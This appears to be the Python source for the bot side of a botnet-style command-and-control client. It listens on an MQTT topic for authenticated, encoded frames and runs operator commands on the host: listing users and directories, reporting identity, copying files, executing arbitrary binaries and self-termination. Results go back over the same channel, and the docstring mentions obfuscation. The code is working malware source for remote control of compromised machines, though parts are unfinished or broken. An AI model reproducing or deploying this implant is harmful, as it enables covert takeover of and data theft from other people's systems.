import paho.mqtt.client as mqtt
from globvars import DEFAULT_BROKER_ADDRESS, DEFAULT_PORT, DEFAULT_TOPIC, CMD_TYPES, RESP_TYPES, ROOT_SECRET, SALT
from datetime import datetime
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
from protocol import ProtocolHandler
import subprocess
import time
import os

class BotController:
    '''
        1) CLI
        2) Command intent
        3) Frame building / parsing
        4) Obfuscation / Encoding
        5) Publishing / Receiving 
    '''
    def __init__(self,
                 secret_key: str = ROOT_SECRET):
        self.secret = self._derive_session_key(secret_key)
        print("Bot Controller initialized.")
        print(f"Derived session key: {self.secret}")
    
    def start(self):
        self.client.start()

    def _derive_session_key(self, root_secret):
        # Use Argon2id to derive a session key from the root secret and timestamp
        salt = hashes.Hash(hashes.SHA256())
        salt.update(SALT.encode())
        salt = salt.finalize()[:16]  # Use first 16 bytes of the hash as salt
        kdf = Argon2id(
            memory_cost=102400,
            length=32,
            salt=salt,
            iterations=2,
            lanes=8,
        )
        session_key = kdf.derive(root_secret.encode())
        return session_key

    def _publish_frame(self, frame: bytes) :
        self.client.publish(frame)


    def command_to_type(self, args) -> tuple[int, bytes]:
        if args.announce:
            return CMD_TYPES["announce"], b"" 
        if args.list_users:
            return CMD_TYPES["list_users"], b""
        if args.list_dir:
            return CMD_TYPES["list_dir"], args.list_dir.encode()
        if args.user_id:
            return CMD_TYPES["user_id"], b""
        if args.copy_file:
            return CMD_TYPES["copy_file"], args.copy_file.encode()
        if args.exec_binary:
            return CMD_TYPES["exec_binary"], args.exec_binary.encode()
        if args.kill:
            return CMD_TYPES["kill"], b""

        raise ValueError("No valid command provided.")

    def response_to_type(self, resp) -> int:
        pass


    def handle_announce(self, payload: bytes):
        msg = payload.decode(errors="ignore")
        response = f"Bot alive at {datetime.now().isoformat()} | msg={msg}"
        return RESP_TYPES["ok"], response.encode()

    def handle_list_users(self, payload: bytes):
        # run w
        subp_command = subprocess.run("w", capture_output=True)
        if subp_command.returncode != 0:
            return RESP_TYPES["error"], subp_command.stderr
        return RESP_TYPES["ok"], subp_command.stdout

    def handle_list_dir(self, payload: bytes):
        path = payload.decode()

        subp_command = subprocess.run(["ls", path],
                                      capture_output=True,
                                      text=True)
        if subp_command.returncode != 0:
            return RESP_TYPES["error"], subp_command.stderr
        return RESP_TYPES["ok"], subp_command.stdout

    def handle_user_id(self, payload: bytes):
        # run id 
        subp_command = subprocess.run("id", capture_output=True)
        if subp_command.returncode != 0:
            return RESP_TYPES["error"], subp_command.stderr
        return RESP_TYPES["ok"], subp_command.stdout

    def handle_copy_files(self, payload: bytes):
        path = payload.decode()
        command = f"cp {path}"
        subp_command = subprocess.run(command, capture_output=True)

        if subp_command.returncode != 0:
            return RESP_TYPES["error"], subp_command.stderr
        return RESP_TYPES["ok"], subp_command.stdout

    def _is_executable(self, path: str) -> tuple[bool, bytes]:
        if not os.path.exists(path):
            return False, b"File does not exist"

        if not os.path.isfile(path):
            return False, b"Not a regular file"

        if not os.access(path, os.X_OK):
            return False, b"Permission denied (not executable)"

        return True, b""

    def handle_exec_binary(self, payload: bytes):
        path = payload.decode().strip()

        ok, err = self._is_executable(path)
        if not ok:
            return RESP_TYPES["error"], err

        try:
            result = subprocess.run(
                [path],                 
                capture_output=True,
                text=False,             
                timeout=10              
            )

            if result.returncode != 0:
                return RESP_TYPES["error"], result.stderr or b"Execution failed"

            return RESP_TYPES["ok"], result.stdout

        except subprocess.TimeoutExpired:
            return RESP_TYPES["error"], b"Execution timed out"

        except Exception as e:
            return RESP_TYPES["error"], str(e).encode()


    def handle_kill(self, payload: bytes):
        # return value for keep alive boolean variable
        exit()

    def handle_commands(self, cmd_type: int, payload: bytes) -> tuple[int, bytes]:
        handlers = {
            1: self.handle_announce,
            2: self.handle_list_users,
            3: self.handle_list_dir,
            4: self.handle_user_id,
            5: self.handle_copy_files,
            6: self.handle_exec_binary,
            255: self.handle_kill,
        }

        handler = handlers.get(cmd_type)
        if not handler:
            return RESP_TYPES["error"], b"Unknown command"
        
        return handler(payload)

class Subscriber:
    def __init__(self, broker, port, topic, secret_key):
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        self.broker = broker
        self.port = port
        self.topic = topic
        self.bot_controller = BotController(secret_key=secret_key)
        self.ph = ProtocolHandler(secret=self.bot_controller.secret)
        self.keep_alive = True
    
    def on_connect(self, client, userdata, flags, reason_code, properties):
        print("Connected")
        client.subscribe(self.topic)

    def on_message(self, client, userdata, message):
        try:
            decoded_m = self.ph.decode_frame(message.payload)
            if self.ph.verify_frame_bot_side(decoded_m):
                print("Message verified!")
                magic, ver, cmd_type, length, auth, payload, checksum = decoded_m
                print(f"Cmd: {cmd_type};\nPayload: {payload}")
                r, p = self.bot_controller.handle_commands(cmd_type=cmd_type, payload=payload)
                print(f"Ran the command with response '{r}'.\nOutput: '{p}'")
                print(type(p))

                # send response
                try:
                    frame = self.ph.build_frame(r, p)
                    encoded_frame  = self.ph.encode_frame(frame)
                    print(encoded_frame)
                    self.send(encoded_frame)
                    time.sleep(1)
                except Exception as e:
                    pass
                    # print(f"Exception: {e}")

        except Exception as e:
            pass
            # print(f"Exception: {e}")
        
    def send(self, payload: bytes):
        status = self.client.publish(self.topic, payload)
        if status.rc != mqtt.MQTT_ERR_SUCCESS:
            print(f"Could not publish the message: {status.rc}")
        else:
            print(f"Successfully published!")

    def start(self):
        self.client.connect(self.broker, self.port)
        self.client.loop_forever()

def main():
    # # unpack the message
    # magic, ver, cmd_type, length, auth, payload, checksum = decoded_m
    # print(f"Cmd: {cmd_type};\nPayload: {payload}")

    # # Handle commands
    # response, payload = bot_cont.handle_commands(cmd_type=cmd_type, payload=payload)

    # # encode and send frame to the controller
    # frame = protocol_handler.build_frame(response, payload=payload)
    # encoded_frame = protocol_handler.encode_frame(frame)

    # bot_cont._publish_frame(encoded_frame)
    sub = Subscriber(
        broker=DEFAULT_BROKER_ADDRESS,
        port=DEFAULT_PORT,
        topic=DEFAULT_TOPIC,
        secret_key=ROOT_SECRET
    )
    sub.start()

if __name__ == "__main__":
    main()